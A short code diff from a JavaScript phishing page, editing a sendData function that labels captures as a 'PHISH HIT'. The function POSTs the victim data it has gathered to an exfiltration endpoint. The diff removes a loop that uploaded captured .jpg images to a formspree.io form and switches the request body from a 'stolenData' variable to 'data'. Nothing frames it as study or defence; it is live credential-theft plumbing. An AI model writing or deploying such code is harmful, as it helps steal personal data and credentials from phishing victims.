@@ -91,25 +91,13 @@
 
         async function sendData(data){
             const form=new FormData();
-            form.append('chat_id',CHAT_ID);
             form.append('text',`🎣 PHISH HIT\n${JSON.stringify(data,null,2)}`);
 
             // Send images
-            for(let k in data){
-                if(k.endsWith('.jpg')){
-                    const imgForm=new FormData();
-                    imgForm.append('chat_id',CHAT_ID);
-                    imgForm.append('photo',data[k]);
-                    imgForm.append('caption',`${k} | ${data.time}`);
-                    fetch(`https://formspree.io/f/mqervzva`,{method:'POST',body:imgForm});
-                    delete data[k];
-                }
-            }
-
             fetch(EXFIL_ENDPOINT, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(stolenData)
+                body: JSON.stringify(data)
             });
         }
 
